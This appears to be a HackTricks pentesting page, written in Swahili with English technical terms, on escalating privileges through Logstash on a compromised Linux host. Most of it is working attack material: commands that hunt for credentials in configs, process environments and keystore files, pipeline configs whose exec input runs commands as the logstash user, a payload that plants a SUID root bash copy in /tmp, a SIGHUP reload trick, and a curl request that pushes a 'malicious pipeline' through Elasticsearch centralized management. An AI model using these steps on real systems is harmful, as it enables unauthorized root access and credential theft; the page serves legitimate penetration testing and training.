# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash hutumika **kukusanya, kubadilisha, na kusambaza logs** kupitia mfumo unaojulikana kama **pipelines**. Pipelines hizi zinajumuisha hatua za **input**, **filter**, na **output**. Kipengele cha kuvutia hujitokeza Logstash inapofanya kazi kwenye mashine iliyoathiriwa.

### Pipeline Configuration

Pipelines husanidiwa katika faili **/etc/logstash/pipelines.yml**, ambayo huorodhesha maeneo ya configurations za pipeline:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Faili hii inaonyesha mahali ambapo faili za **.conf**, zilizo na mipangilio ya pipeline, zinapatikana. Unapotumia **Elasticsearch output module**, ni kawaida kwa **pipelines** kuwa na **Elasticsearch credentials**, ambazo mara nyingi huwa na privileges pana kwa sababu Logstash inahitaji kuandika data kwenye Elasticsearch. Wildcards katika paths za configuration huruhusu Logstash kutekeleza pipelines zote zinazolingana katika directory iliyoteuliwa.

Ikiwa Logstash imeanzishwa kwa `-f <directory>` badala ya `pipelines.yml`, **faili zote zilizo ndani ya directory hiyo huunganishwa kwa mpangilio wa lexicographical na kuchanganuliwa kama config moja**. Hii huleta implications 2 za offensive:

- Faili iliyowekwa kama `000-input.conf` au `zzz-output.conf` inaweza kubadilisha jinsi pipeline ya mwisho inavyoundwa
- Faili yenye hitilafu inaweza kuzuia pipeline nzima kupakiwa, hivyo validate payloads kwa uangalifu kabla ya kutegemea auto-reload

### Fast Enumeration kwenye Host Iliyoathirika

Kwenye box ambayo Logstash imewekwa, kagua kwa haraka:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Pia angalia ikiwa API ya ufuatiliaji ya ndani inafikika. Kwa chaguo-msingi, inafungamana na **127.0.0.1:9600**, ambayo kwa kawaida inatosha baada ya kufikia host:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Hii kwa kawaida hukupa pipeline IDs, maelezo ya runtime, na uthibitisho kwamba pipeline yako iliyorekebishwa imepakiwa.

Credentials zilizopatikana kutoka Logstash mara nyingi hufungua **Elasticsearch**, hivyo angalia [ukurasa huu mwingine kuhusu Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Ili kujaribu privilege escalation, kwanza tambua user ambaye huduma ya Logstash inaendeshwa chini yake, kwa kawaida user wa **logstash**. Hakikisha unatimiza **moja** ya vigezo hivi:

- Una **write access** kwenye faili ya pipeline **.conf** **au**
- Faili ya **/etc/logstash/pipelines.yml** inatumia wildcard, na unaweza kuandika kwenye folder lengwa

Zaidi ya hayo, **moja** ya masharti haya lazima itimizwe:

- Uwezo wa kuanzisha upya huduma ya Logstash **au**
- Faili ya **/etc/logstash/logstash.yml** ina **config.reload.automatic: true** iliyowekwa

Ikiwa kuna wildcard kwenye configuration, kuunda faili inayolingana na wildcard hiyo kunaruhusu command execution. Kwa mfano:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hapa, **interval** huamua marudio ya utekelezaji kwa sekunde. Katika mfano uliotolewa, amri ya **whoami** huendeshwa kila baada ya sekunde 120, huku matokeo yake yakielekezwa kwenye **/tmp/output.log**.

Kwa **config.reload.automatic: true** katika **/etc/logstash/logstash.yml**, Logstash itagundua na kutumia kiotomatiki pipeline configurations mpya au zilizorekebishwa bila kuhitaji kuwashwa upya. Ikiwa hakuna wildcard, marekebisho bado yanaweza kufanywa kwenye configurations zilizopo, lakini tahadhari inashauriwa ili kuepuka disruptions.

### Payloads za Pipeline Zinazoaminika Zaidi

`exec` input plugin bado inafanya kazi katika releases za sasa na inahitaji ama `interval` au `schedule`. Huendesha kwa **forking** Logstash JVM, kwa hivyo ikiwa memory ni ndogo payload yako inaweza kushindwa kwa **ENOMEM** badala ya kuendelea kufanya kazi bila taarifa.

Payload ya privilege-escalation yenye matumizi zaidi kwa kawaida huwa ile inayoacha durable artifact:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Ikiwa huna ruhusa za kuanzisha upya lakini unaweza kutuma signal kwa process, Logstash pia inasaidia reload inayochochewa na **SIGHUP** kwenye mifumo inayofanana na Unix:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Kumbuka kwamba si kila plugin inaruhusu reload. Kwa mfano, input ya **stdin** huzuia reload ya kiotomatiki, kwa hivyo usidhani kwamba `config.reload.automatic` itagundua mabadiliko yako kila mara.

### Kuiba Siri kutoka Logstash

Kabla ya kulenga tu code execution, kusanya data ambayo Logstash tayari inaweza kufikia:

- Credentials za plaintext mara nyingi huwekwa moja kwa moja ndani ya outputs za `elasticsearch {}`, `http_poller`, JDBC inputs, au mipangilio inayohusiana na cloud
- Mipangilio salama inaweza kuwa ndani ya **`/etc/logstash/logstash.keystore`** au directory nyingine ya `path.settings`
- Nenosiri la keystore mara nyingi hutolewa kupitia **`LOGSTASH_KEYSTORE_PASS`**, na usakinishaji unaotumia package kwa kawaida hulipata kutoka **`/etc/sysconfig/logstash`**
- Upanuzi wa environment variable kwa kutumia `${VAR}` hutatuliwa Logstash inapoanzishwa, kwa hivyo environment ya service inafaa kukaguliwa

Ukaguzi muhimu:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Hili pia linafaa kukaguliwa kwa sababu **CVE-2023-46672** ilionyesha kwamba Logstash inaweza kurekodi taarifa nyeti kwenye logs chini ya hali maalum. Kwenye host ya post-exploitation, Logstash logs za zamani na entries za `journald` zinaweza hivyo kufichua credentials hata kama config ya sasa inarejelea keystore badala ya kuhifadhi secrets moja kwa moja.

### Matumizi Mabaya ya Centralized Pipeline Management

Katika baadhi ya mazingira, host **haitumii** local `.conf` files kabisa. Ikiwa **`xpack.management.enabled: true`** imewekwa, Logstash inaweza kuvuta pipelines zinazosimamiwa centrally kutoka Elasticsearch/Kibana, na baada ya kuwezesha mode hii, local pipeline configs si chanzo halisi tena.

Hii inamaanisha attack path tofauti:

1. Rejesha Elastic credentials kutoka local Logstash settings, keystore, au logs
2. Thibitisha kama account ina cluster privilege ya **`manage_logstash_pipelines`**
3. Create au replace centrally managed pipeline ili host ya Logstash itekeleze payload yako kwenye poll interval inayofuata

Elasticsearch API inayotumika kwa feature hii ni:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Hii ni muhimu sana wakati local files ni read-only lakini Logstash tayari imesajiliwa ili kuchukua pipelines remotely.

## Marejeo

- [Elastic Docs: Kupakia upya Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Kusanidi Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
